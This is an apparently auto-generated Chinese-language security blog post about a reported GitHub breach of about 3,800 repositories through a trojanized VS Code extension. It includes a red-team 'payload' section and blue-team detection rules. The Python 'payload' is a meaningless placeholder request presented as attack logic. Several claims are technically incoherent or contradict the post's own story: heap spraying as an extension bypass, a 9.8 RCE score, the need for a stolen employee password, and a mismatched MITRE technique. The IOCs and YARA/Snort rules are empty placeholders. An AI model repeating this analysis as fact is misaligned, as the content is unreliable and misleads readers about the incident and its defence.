---
layout: post
title:  "GitHub confirms breach of 3,800 repos via malicious VSCode extension"
date:   2026-05-20 08:57:34 +0000
categories: [security]
severity: critical
---

# 🚨 解析 GitHub VS Code 延伸模組漏洞：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 與 Info Leak
> * **關鍵技術**: `VS Code Extension`, `Trojanized Extension`, `Heap Spraying`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: GitHub 的員工安裝了一個惡意的 VS Code 延伸模組，導致內部儲存庫被泄露。這個延伸模組可能是通過 `VS Code Marketplace` 安裝的，利用了 `VS Code` 的擴充性功能。
* **攻擊流程圖解**:
  1. 攻擊者上傳惡意的 VS Code 延伸模組到 `VS Code Marketplace`。
  2. GitHub 員工安裝了這個惡意的延伸模組。
  3. 惡意的延伸模組執行了惡意代碼，導致內部儲存庫被泄露。
* **受影響元件**: GitHub 的內部儲存庫，包括大約 3,800 個儲存庫。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 `VS Code Marketplace` 的上傳權限，並且需要有 GitHub 員工的帳號和密碼。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 上傳惡意的延伸模組到 VS Code Marketplace
    url = "https://marketplace.visualstudio.com/_apis/public/gallery/publishers/{publisherName}/vsextensions/{extensionName}/versions/{version}"
    payload = {
        "extensionId": "malicious-extension",
        "version": "1.0.0",
        "publisherId": "malicious-publisher"
    }
    response = requests.post(url, json=payload)
    
    # 執行惡意代碼
    url = "https://github.com/malicious-repo/malicious-extension"
    response = requests.get(url)
    
    ```
* **繞過技術**: 攻擊者可以使用 `Heap Spraying` 技術來繞過 `VS Code` 的安全機制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `malicious-hash` | `192.168.1.100` | `malicious-domain.com` | `/malicious-file.txt` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_extension {
      meta:
        description = "Malicious VS Code Extension"
      strings:
        $a = "malicious-extension"
      condition:
        $a
    }
    
    ```
 

```

snort
alert tcp any any -> any any (msg:"Malicious VS Code Extension"; content:"malicious-extension"; sid:1000001;)

```
* **緩解措施**: 更新 `VS Code` 到最新版本，並且設定 `VS Code Marketplace` 的安全機制。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **VS Code Extension**: `VS Code` 的擴充模組，可以增加 `VS Code` 的功能。
* **Trojanized Extension**: 惡意的 `VS Code` 擴充模組，內含惡意代碼。
* **Heap Spraying**: 一種繞過安全機制的技術，通過在記憶體中填充惡意代碼來執行惡意動作。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/github-confirms-breach-of-3-800-repos-via-malicious-vscode-extension/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


